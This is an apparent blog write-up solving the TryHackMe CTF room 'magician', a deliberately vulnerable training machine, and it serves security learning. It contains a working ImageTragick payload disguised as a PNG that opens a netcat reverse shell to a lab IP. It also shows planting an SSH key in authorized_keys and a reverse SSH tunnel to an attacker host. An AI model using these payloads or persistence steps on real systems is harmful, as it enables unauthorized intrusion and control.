---
title: "magician"
date: 2025-02-21
image: /assets/img/tryhackme/Magician/Magician_image.jpg
description: Writeup of the TryHackMe-CTF magician
categories: [TryHackMe, Easy]
tags: [linux, imagemagick]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>magician</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>This magical website lets you convert image file formats</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/magician">https://tryhackme.com/room/magician</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge magician.  

## Enumeration

> Don't forget to add `magician` to your hosts file :)
{: .prompt-warning }

I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.58.161                           
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-21 14:42 EST
  Nmap scan report for magician (10.10.58.161)
  Host is up (0.041s latency).
  Not shown: 65532 closed tcp ports (conn-refused)
  PORT     STATE SERVICE
  21/tcp   open  ftp
  8080/tcp open  http-proxy
  8081/tcp open  blackice-icecap

  Nmap done: 1 IP address (1 host up) scanned in 38.17 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 21,8080,8081 10.10.58.161
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-21 14:43 EST
  Nmap scan report for magician (10.10.58.161)
  Host is up (0.037s latency).

  PORT     STATE SERVICE    VERSION
  21/tcp   open  ftp        vsftpd 2.0.8 or later
  8080/tcp open  http-proxy
  |_http-title: Site doesn't have a title (application/json).
  | fingerprint-strings: 
  |   FourOhFourRequest: 
  |     HTTP/1.1 404 
  |     Vary: Origin
  |     Vary: Access-Control-Request-Method
  |     Vary: Access-Control-Request-Headers
  |     Content-Type: application/json
  |     Date: Tue, 25 Feb 2025 19:43:48 GMT
  |     Connection: close
  |     {"timestamp":"2025-02-25T19:43:48.398+0000","status":404,"error":"Not Found","message":"No message available","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
  |   GetRequest: 
  |     HTTP/1.1 404 
  |     Vary: Origin
  |     Vary: Access-Control-Request-Method
  |     Vary: Access-Control-Request-Headers
  |     Content-Type: application/json
  |     Date: Tue, 25 Feb 2025 19:43:48 GMT
  |     Connection: close
  |     {"timestamp":"2025-02-25T19:43:47.955+0000","status":404,"error":"Not Found","message":"No message available","path":"/"}
  |   HTTPOptions: 
  |     HTTP/1.1 404 
  |     Vary: Origin
  |     Vary: Access-Control-Request-Method
  |     Vary: Access-Control-Request-Headers
  |     Content-Type: application/json
  |     Date: Tue, 25 Feb 2025 19:43:48 GMT
  |     Connection: close
  |     {"timestamp":"2025-02-25T19:43:48.187+0000","status":404,"error":"Not Found","message":"No message available","path":"/"}
  |   RTSPRequest: 
  |     HTTP/1.1 505 
  |     Content-Type: text/html;charset=utf-8
  |     Content-Language: en
  |     Content-Length: 465
  |     Date: Tue, 25 Feb 2025 19:43:48 GMT
  |     <!doctype html><html lang="en"><head><title>HTTP Status 505 
  |     HTTP Version Not Supported</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 505 
  |_    HTTP Version Not Supported</h1></body></html>
  8081/tcp open  http       nginx 1.14.0 (Ubuntu)
  |_http-server-header: nginx/1.14.0 (Ubuntu)
  |_http-title: magician
```
From here I proceeded the analysis port by port.

## Port 21 Analysis

I tried to login as anonymous, and it first, seemed to have connection issues, but after some time I received the following response:
```bash
$ ftp anonymous@10.10.58.161          
  Connected to 10.10.58.161.
  220 THE MAGIC DOOR
  331 Please specify the password.
  Password: 
  230-Huh? The door just opens after some time? You're quite the patient one, aren't ya, it's a thing called 'delay_successful_login' in /etc/vsftpd.conf ;) Since you're a rookie, this might help you to get started: https://imagetragick.com. You might need to do some little tweaks though...
  230 Login successful.
ftp> dir
	550 Permission denied.
```

The only hint seemed to be the URL, which explained an ImageMagick vulnerability.

## Port 8081 Analysis

The website displayed an image converter, which likely used ImageMagick in the backend, as suggested by the hint from the FTP server. 

![Image Converter](/assets/img/tryhackme/Magician/thm_magician_1.jpg)

I researched the vulnerability and found some example payloads on <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Picture%20ImageMagick">PayloadsAllTheThings</a>. I then created the following PNG file as a reverse shell:
```bash
$ cat test.png
  push graphic-context
  encoding "UTF-8"
  viewbox 0 0 1 1
  affine 1 0 0 1 0 0
  push graphic-context
  image Over 0,0 1,1 '|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f'
  pop graphic-context
  pop graphic-context
```

I uploaded the PNG file to the image converter, and after converting it to JPG, my Penelope received the reverse shell. From there, I retrieved the user flag:
```bash
[+] Got reverse shell from magician-10.10.64.156-Linux-x86_64  Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/magician~10.10.64.156_Linux_x86_64/2025_03_09-08_40_21-337.log 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
magician@magician:/tmp/hsperfdata_magician$ cd /home/magician

magician@magician:~$ cat user.txt 
THM{[removed]}
```

Since I had initial access, I started to enumerate the machine and found an interesting file: 
```bash
magician@magician:~$ cat the_magic_continues 
The magician is known to keep a locally listening cat up his sleeve, it is said to be an oracle who will tell you secrets if you are good enough to understand its meows.
```

The word "listening" caught my attention, so I searched for open ports and discovered a hidden service:
```bash
magician@magician:~$ netstat -l
[...]
tcp        0      0 localhost:6666          0.0.0.0:*               LISTEN 
```

To access the service, I first created a new SSH key pair locally and inserted it into the `authorized_keys` on the magician machine:
```bash
$ ssh-keygen -t rsa
  Generating public/private rsa key pair.
  Enter file in which to save the key (/home/kali/.ssh/id_rsa): /home/kali/ctf/magician/id_rsa
  Enter passphrase (empty for no passphrase):
  Enter same passphrase again:
  Your identification has been saved in /home/kali/ctf/magician/id_rsa
  Your public key has been saved in /home/kali/ctf/magician/id_rsa.pub
  The key fingerprint is:
  SHA256:[removed] kali@kali
  The key's randomart image is:
  +---[RSA 3072]----+
  |      . E        |
  |     ..+ . .     |
  |. + . o=. + .    |
  | B = *ooo. o     |
  |* + * +oS        |
  | o = ++.*.       |
  |  .o+o.* +       |
  |  ++= .   .      |
  | o.o+o           |
  +----[SHA256]-----+
$ cat id_rsa.pub
  ssh-ed25519 AAaEIF0C7HeeDr7HeNTE5A[...]B7hVAr7HeeDaEIF0 kali@kali
magician@magician:~$ echo 'ssh-ed25519 AAaEIF0C7HeeDr7HeNTE5A[...]B7hVAr7HeeDaEIF0 kali@kali' > /home/magician/.ssh/authorized_keys
```

Since my public key was in the `authorized_keys`, I was able to connect back from the machine and tunnel the port of the hidden service. 
```bash
ssh -R 8082:localhost:6666 kali@[attackerip]
```

Using the website, I retrieved the root flag:

![Hidden Service](/assets/img/tryhackme/Magician/thm_magician_2.jpg)

![Root Flag](/assets/img/tryhackme/Magician/thm_magician_3.jpg)

solved! :)